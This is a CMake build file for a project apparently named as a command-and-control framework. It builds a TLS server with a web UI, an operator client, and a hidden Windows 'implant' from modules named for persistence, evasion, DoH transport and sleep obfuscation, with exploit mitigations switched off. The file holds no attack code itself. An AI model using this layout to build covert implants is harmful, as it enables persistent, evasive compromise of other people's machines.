cmake_minimum_required(VERSION 3.20)
project(c2 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

if (NOT CMAKE_BUILD_TYPE)
    set(CMAKE_BUILD_TYPE Release)
endif()

set(SHARED_SRC
    shared/proto.cpp
    shared/crypto.cpp
)

if (NOT WIN32)
    find_package(OpenSSL REQUIRED)
    find_package(Threads REQUIRED)

    add_library(c2_shared STATIC ${SHARED_SRC})
    target_include_directories(c2_shared PUBLIC ${CMAKE_SOURCE_DIR})
    target_link_libraries(c2_shared PUBLIC OpenSSL::Crypto)

    find_package(Python3 COMPONENTS Interpreter)
    set(WEB_SRC
        server/web/index.html
        server/web/app.css
        server/web/app.js
        server/web/embed.py
    )
    if (Python3_Interpreter_FOUND)
        add_custom_command(
            OUTPUT ${CMAKE_SOURCE_DIR}/server/webui.h
            COMMAND ${Python3_EXECUTABLE} ${CMAKE_SOURCE_DIR}/server/web/embed.py
            DEPENDS ${WEB_SRC}
            COMMENT "embedding web assets into server/webui.h"
            VERBATIM
        )
    else()
        add_custom_command(
            OUTPUT ${CMAKE_SOURCE_DIR}/server/webui.h
            COMMAND python ${CMAKE_SOURCE_DIR}/server/web/embed.py
            DEPENDS ${WEB_SRC}
            COMMENT "embedding web assets into server/webui.h"
            VERBATIM
        )
    endif()
    add_custom_target(c2_webui DEPENDS ${CMAKE_SOURCE_DIR}/server/webui.h)

    add_executable(c2server
        server/main.cpp
        server/http_frame.cpp
        server/tls_listener.cpp
        server/session_router.cpp
        server/task_queue.cpp
        server/session_store.cpp
        server/op_routes.cpp
        server/op_listener.cpp
    )
    target_include_directories(c2server PRIVATE ${CMAKE_SOURCE_DIR} ${CMAKE_SOURCE_DIR}/server)
    target_link_libraries(c2server PRIVATE c2_shared OpenSSL::SSL OpenSSL::Crypto Threads::Threads)
    add_dependencies(c2server c2_webui)

    add_executable(c2operator
        operator/main.cpp
        operator/commands.cpp
        operator/protocol.cpp
    )
    target_include_directories(c2operator PRIVATE ${CMAKE_SOURCE_DIR})
    target_link_libraries(c2operator PRIVATE c2_shared Threads::Threads)
endif()

if (WIN32)
    add_library(c2_shared_win STATIC ${SHARED_SRC})
    target_include_directories(c2_shared_win PUBLIC ${CMAKE_SOURCE_DIR})
    find_package(OpenSSL REQUIRED)
    target_link_libraries(c2_shared_win PUBLIC OpenSSL::Crypto)

    add_executable(implant WIN32
        implant/main.cpp
        implant/doh_resolver.cpp
        implant/transport.cpp
        implant/tasks.cpp
        implant/persistence.cpp
        implant/evade.cpp
        implant/ekko.cpp
    )
    target_include_directories(implant PRIVATE ${CMAKE_SOURCE_DIR})
    target_link_libraries(implant PRIVATE
        c2_shared_win OpenSSL::Crypto winhttp ws2_32 advapi32)
    target_compile_options(implant PRIVATE /O2 /MT /GS- /guard:cf-)
    target_link_options(implant PRIVATE /ENTRY:WinMain /SUBSYSTEM:WINDOWS)
endif()
